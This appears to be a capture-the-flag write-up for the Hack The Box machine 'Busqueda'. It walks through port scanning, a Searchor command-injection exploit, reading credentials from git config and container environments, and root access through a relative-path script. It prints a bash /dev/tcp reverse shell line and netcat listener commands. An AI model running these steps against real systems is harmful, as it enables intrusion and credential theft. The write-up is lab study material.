# HTB Busqueda

### Scope: 10.129.228.217

To begin, we performed an **SYN scan** on the target (first 1000 ports) with aggressive scanning enabled:

```bash
nmap -sS -A 10.129.228.217 -oN scan.txt
```

#### Nmap Scan Results

The scan revealed two open ports:

- **22/tcp (SSH)** – Running OpenSSH 8.9p1 on Ubuntu
- **80/tcp (HTTP)** – Hosting an Apache 2.4.52 web server, with a Python-based Flask application using Werkzeug 2.1.2

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
```

The hostname `searcher.htb` was identified, so an entry was added to `/etc/hosts`:

```bash
sudo echo "10.129.228.217 searcher.htb" >> /etc/hosts
```

### Web Enumeration

Navigating to `http://searcher.htb`, we encountered a **Flask-based web application** named **Searcher**. The application’s footer provided useful insights into its dependencies and framework versions.

![](./assets/searcher-flask-app.png)
![](./assets/searcher-footer.png)

#### Identifying a Known Vulnerability

Upon investigating the **Searchor** project on GitHub, a **vulnerability disclosure** was found, along with a **proof-of-concept (PoC) exploit** for **Searchor 2.4.0**.

- GitHub Security Advisory: [Searchor GitHub](https://github.com/ArjunSharda/Searchor/security)
- PoC Exploit: [GitHub PoC](https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection)

### Exploiting Command Injection

The PoC exploit leverages a **command injection vulnerability** in the search functionality. The crafted payload executes arbitrary Python commands via **unsanitized user input**.

#### Reverse Shell Execution

After modifying the PoC, we executed the following steps to gain a foothold:

1. **Start a netcat listener:**
   ```bash
   nc -lvnp 1337
   ```
2. **Execute the exploit script:**
   ```bash
   ./exploit.sh searcher.htb 10.10.16.32 1337
   ```

This granted a **reverse shell** as the user `svc`.

![](./assets/user.png)

---

## Privilege Escalation

### Credential Discovery

Examining the application directory, we discovered a **Git repository configuration file** (`.git/config`), which contained hardcoded credentials:

```ini
[remote "origin"]
    url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
```

Additionally, a **Gitea instance** (`gitea.searcher.htb`) was identified, prompting an update to `/etc/hosts`:

```bash
sudo echo "10.129.228.217 gitea.searcher.htb" >> /etc/hosts
```

### Shell Upgrade

To enhance shell stability, we spawned an **interactive TTY shell**:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Abusing Sudo Privileges

Running `sudo -l` with **svc** (using the discovered `cody` password) revealed **root execution privileges** on a Python script:

```bash
(ALL) NOPASSWD: /usr/bin/python3 /opt/scripts/system-checkup.py *
```

However, **reading permissions were restricted**, preventing direct inspection of the script.

### Enumerating Running Containers

Executing `system-checkup.py` with `docker-ps` revealed two running **Docker containers**:

```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
```

- **Gitea container (port 3000)**
- **MySQL database container (port 3306, loopback only)**

We then **inspected the container environment variables** looking for credentials:

```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{ .Config.Env }}' <container_id>
```

This yielded **MySQL root credentials**:

```
MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF
```

and a **Gitea database password**:

```
GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh
```

### Gaining Database Access

Since MySQL was bound to **127.0.0.1:3306**, we used the **root credentials** to access it locally:

```bash
mysql -h 127.0.0.1 -u root -p
```

From the **`gitea` database**, we extracted user details:

```sql
SELECT id, name, passwd FROM user;
```

This included the **administrator** username, which we then paired with `yuiu1hoiu4i5ho1uh` to log in to **Gitea**.

### Exploiting a Misconfigured Python Script

Inside **Gitea**, we located the repository containing `system-checkup.py`, which included an **unsafe execution call**:

```python
elif action == 'full-checkup':
    try:
        arg_list = ['./full-checkup.sh']
        print(run_command(arg_list))
    except:
        print('Something went wrong')
```

Since Python **searches the current directory first** for relative paths, we exploited this by **creating a malicious script** in the expected location:

```bash
echo '#!/bin/bash' > full-checkup.sh
echo 'bash -i >& /dev/tcp/10.10.16.32/5656 0>&1' >> full-checkup.sh
chmod +x full-checkup.sh
```

Executing the vulnerable script as `root`:

```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

Triggered a **reverse shell as root**, successfully **compromising the system**.
![](./assets/root.png)
---

## Conclusion

The **Busqueda** machine demonstrated several **critical security weaknesses**:

1. **Unsanitized User Input** – Allowed **command injection**, leading to **initial access**.
2. **Password Reuse** – Hardcoded credentials enabled **lateral movement**.
3. **Inappropriate Application Bundling** – Exposed unnecessary services, increasing the attack surface.
4. **Custom System Administration Practices** – Poorly implemented scripts enabled **privilege escalation**.

This challenge underscores the importance of **input validation, secure credential management, minimal software exposure, and adherence to best practices** in system administration.
